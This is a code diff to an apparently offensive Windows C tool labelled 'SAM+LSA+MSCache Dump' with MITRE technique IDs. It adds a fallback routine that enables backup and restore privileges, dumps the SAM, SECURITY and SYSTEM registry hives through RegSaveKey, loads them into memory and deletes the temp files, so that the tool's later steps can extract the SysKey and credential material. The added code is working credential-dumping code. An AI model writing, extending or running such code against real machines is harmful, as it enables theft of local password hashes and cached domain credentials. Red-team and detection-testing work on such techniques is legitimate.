@@ -129,6 +129,85 @@ static DWORD ParseMSCache(PBYTE sec, SIZE_T sz, WCHAR*** names, WCHAR*** domains
     return cnt;
 }
 
+// ─── Fallback path: save hives via RegSaveKey (SE_BACKUP_NAME) ───
+// Works on any filesystem (ReFS etc.) where raw NTFS parsing is unavailable.
+
+static BOOL EnablePrivilege(LPCWSTR privName) {
+    HANDLE hTok = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return FALSE;
+    TOKEN_PRIVILEGES tp = {0};
+    tp.PrivilegeCount = 1;
+    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
+        CloseHandle(hTok); return FALSE;
+    }
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
+    DWORD err = GetLastError();
+    CloseHandle(hTok);
+    return ok && err == ERROR_SUCCESS;
+}
+
+static BOOL ReadHiveFile(PWSTR path, HIVE_DATA* h) {
+    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return FALSE;
+    DWORD sz = GetFileSize(hf, NULL);
+    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hf); return FALSE; }
+    // VirtualAlloc so FreeHiveData() (VirtualFree) can release it later
+    h->data = (PBYTE)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!h->data) { CloseHandle(hf); return FALSE; }
+    DWORD rd = 0;
+    BOOL ok = ReadFile(hf, h->data, sz, &rd, NULL) && rd == sz;
+    CloseHandle(hf);
+    if (!ok) { VirtualFree(h->data, 0, MEM_RELEASE); h->data = NULL; return FALSE; }
+    h->size = sz;
+    return TRUE;
+}
+
+static BOOL FallbackSaveHives(HIVE_DATA* sam, HIVE_DATA* sec, HIVE_DATA* sys) {
+    if (!EnablePrivilege(SE_BACKUP_NAME) || !EnablePrivilege(SE_RESTORE_NAME)) {
+        wprintf(L"      [ERR] Failed to enable backup privileges\n");
+        return FALSE;
+    }
+
+    WCHAR tmpDir[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, tmpDir)) return FALSE;
+
+    struct { PCWSTR sub; PCWSTR fname; HIVE_DATA* out; } jobs[] = {
+        { L"SAM",      L"bench_sam.hive",      sam },
+        { L"SECURITY", L"bench_security.hive", sec },
+        { L"SYSTEM",   L"bench_system.hive",   sys },
+    };
+
+    BOOL allOk = TRUE;
+    for (int i = 0; i < 3; i++) {
+        WCHAR path[MAX_PATH];
+        swprintf_s(path, MAX_PATH, L"%ls%ls", tmpDir, jobs[i].fname);
+
+        HKEY hKey = NULL;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, jobs[i].sub, 0, KEY_READ, &hKey)
+            != ERROR_SUCCESS) {
+            wprintf(L"      [ERR] RegOpenKeyEx %s failed\n", jobs[i].sub);
+            allOk = FALSE;
+            continue;
+        }
+        LSTATUS lr = RegSaveKeyW(hKey, path, NULL);
+        RegCloseKey(hKey);
+        if (lr != ERROR_SUCCESS) {
+            wprintf(L"      [ERR] RegSaveKey %s failed (err=%d)\n", jobs[i].sub, lr);
+            allOk = FALSE;
+            continue;
+        }
+        if (!ReadHiveFile(path, jobs[i].out)) {
+            wprintf(L"      [ERR] ReadHiveFile %s failed\n", jobs[i].fname);
+            allOk = FALSE;
+        }
+        DeleteFileW(path);
+    }
+    return allOk;
+}
+
 // ─── Main ───
 int wmain(void) {
     wprintf(L"[*] SAM+LSA+MSCache Dump — T1003.002/004/005\n");
@@ -150,7 +229,7 @@ int wmain(void) {
     if (!ReadMft(hVol, &ctx, &mft, &mftSz)) { CloseHandle(hVol); return 1; }
     wprintf(L"OK (%lld MB)\n", mftSz / 1024 / 1024);
 
-    // 3. Extract hives
+    // 3. Extract hives (raw NTFS first, RegSaveKey fallback)
     wprintf(L"[3] Extracting SAM/SECURITY/SYSTEM... ");
     HIVE_DATA sam = {0}, sec = {0}, sys = {0};
     BOOL s1 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
@@ -163,7 +242,15 @@ int wmain(void) {
     wprintf(L"%s/%s/%s (%lld/%lld/%lld bytes)\n",
         s1?L"SAM":L"FAIL", s2?L"SEC":L"FAIL", s3?L"SYS":L"FAIL",
         sam.size, sec.size, sys.size);
-    if (!s1 || !s3) return 1;
+    if (!s1 || !s3) {
+        wprintf(L"      [i] Raw NTFS failed — falling back to RegSaveKey (backup privilege)...\n");
+        FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
+        if (!FallbackSaveHives(&sam, &sec, &sys)) {
+            wprintf(L"      [ERR] Fallback also failed\n");
+            return 1;
+        }
+        s1 = sam.data != NULL; s2 = sec.data != NULL; s3 = sys.data != NULL;
+    }
 
     // 4. Extract SysKey
     wprintf(L"[4] Extracting SysKey... ");
